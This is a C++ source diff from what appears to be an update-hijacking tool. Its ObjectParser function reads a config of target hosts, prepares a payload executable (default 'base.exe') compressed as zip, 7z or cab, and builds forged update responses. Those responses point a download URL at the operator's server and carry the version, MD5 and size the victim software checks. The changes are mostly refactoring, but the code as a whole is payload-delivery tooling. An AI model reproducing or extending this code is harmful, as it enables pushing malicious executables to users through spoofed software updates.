@@ -50,15 +50,22 @@ string ResponseFromRegex(const char* regex, const  char* format,  int size,const
 				type = (char*)"application/json; charset=utf-8";
 				continue;
 			}
+			case 'P': {
+				type = (char*)"text/plain";
+				continue;
+			}
+			case 'X': {
+				type = (char*)"text/plain";
+				continue;
+			}
 			case 'B': {
 				type = (char*)"binary/octet-stream";
 				continue;
 			}
-			case 'X': {
+			case 'U': {
 				type = (char*)"application/x-www-form-urlencoded";
 				continue;
 			}
-
 			case ' ':
 			{
 				continue;
@@ -136,29 +143,6 @@ string ObjectFromRegex(const char* regex, const  char* format, const char * url,
 	//vsprintf(outbuf, "str:%s\r\n", args);
 	outLen = vsprintf(outbuf, format, args);
 	//va_end(args);
-	/*
-	__asm {
-		
-		lea edx,params
-		mov eax,cnt
-		shl eax,2
-		add edx,eax
-		sub edx,4
-		mov ecx, cnt
-		__push_params:
-		push[edx]
-		sub edx,4
-		loop __push_params
-		mov eax, format
-		push eax
-		mov eax, outbuf
-		push eax
-		call sprintf
-		mov outLen,eax
-
-		add esp,[ backsize]
-	}
-	*/
 	string retstr = string(outbuf, outLen);
 	delete []outbuf;
 	return retstr;
@@ -183,9 +167,9 @@ int ObjectParser(vector<string> &targetHost) {
 	char* file = 0;
 	int ret = 0;
 
-	string curpath = gLocalPath + "config\\";
+	string cfgpath = gLocalPath + "config\\";
 
-	ret = FileOper::fileReader(curpath+"objects.json", &file, &fs);
+	ret = FileOper::fileReader(cfgpath +"objects.json", &file, &fs);
 	if (ret == 0) {
 		log("%s %d error\r\n", __FUNCTION__, __LINE__);
 		exit(-1);
@@ -216,19 +200,33 @@ int ObjectParser(vector<string> &targetHost) {
 				payloadfn = "base.exe";
 			}
 
-			string inzipfn = obj[i]["inCompName"].asString();
 			string comp = obj[i]["compress"].asString();
-			if (comp == "7z")
-			{
-				string outfn = GetMainFileName(payloadfn) + ".zip";
-				ret = Public::zipFile(inzipfn.c_str(), (char*)payloadfn.c_str(), (char*)outfn.c_str());
-				payloadfn = outfn;
+			if ( comp != "") {
+				
+				if (comp == "zip")
+				{
+					string inzipfn = payloadfn;
+					string outfn = GetMainFileName(payloadfn) + ".zip";
+					ret = Public::zipFile(inzipfn.c_str(), (char*)payloadfn.c_str(), (char*)outfn.c_str());
+					payloadfn = GetMainFileName(payloadfn) + ".zip";
+				}
+				else if (comp == "7z") {
+					string inzipfn = payloadfn;
+					string outfn = GetMainFileName(payloadfn) + ".7z";
+					Compress7z((char*)outfn.c_str(), (char*)payloadfn.c_str(), (char*)inzipfn.c_str());
+					payloadfn =  GetMainFileName(payloadfn) + ".7z";
+				}
+				else if (comp == "cab") {
+					string inzipfn = payloadfn;
+					string outfn = GetMainFileName(payloadfn) + ".cab";
+					
+					MakeCab((char*)outfn.c_str(), (char*)payloadfn.c_str(), (char*)inzipfn.c_str());
+					payloadfn = GetMainFileName(payloadfn) + ".cab";
+				}
 			}
-			else if (comp == "zip") {
-				string outfn = GetMainFileName(payloadfn) + ".7z";
-				Compress7z((char*)outfn.c_str(), (char*)payloadfn.c_str(), (char*)inzipfn.c_str());
-				payloadfn = outfn;
-			}
+
+
+			CopyFileA((cfgpath + payloadfn).c_str(), (pluginPath + payloadfn).c_str(), 0);
 
 			string version = obj[i]["version"].asString();
 			if (version == "") {
@@ -256,15 +254,15 @@ int ObjectParser(vector<string> &targetHost) {
 
 			string respRegex = obj[i]["respRegex"].asString();
 			char download[1024];
-			wsprintfA(download, "http://%s/%s", gstrServerIP.c_str(), payloadfn.c_str());
+			wsprintfA(download, "http://%s/%s", gstrServerIP.c_str(), payloadfn.c_str());	
 
 			char* format = 0;
 			int formatLen = 0;
-			ret = FileOper::fileReader((curpath + formatfn).c_str(), &format, &formatLen);
+			ret = FileOper::fileReader((cfgpath + formatfn).c_str(), &format, &formatLen);
 
 			char* respFormat = 0;
 			int respFormatLen = 0;
-			ret = FileOper::fileReader((curpath + respFormatfn).c_str(), &respFormat, &respFormatLen);
+			ret = FileOper::fileReader((cfgpath + respFormatfn).c_str(), &respFormat, &respFormatLen);
 			if (respFormatLen && formatLen) {
 				string object = ObjectFromRegex(regex.c_str(), format, download, version.c_str(), md5.c_str(), size);
 
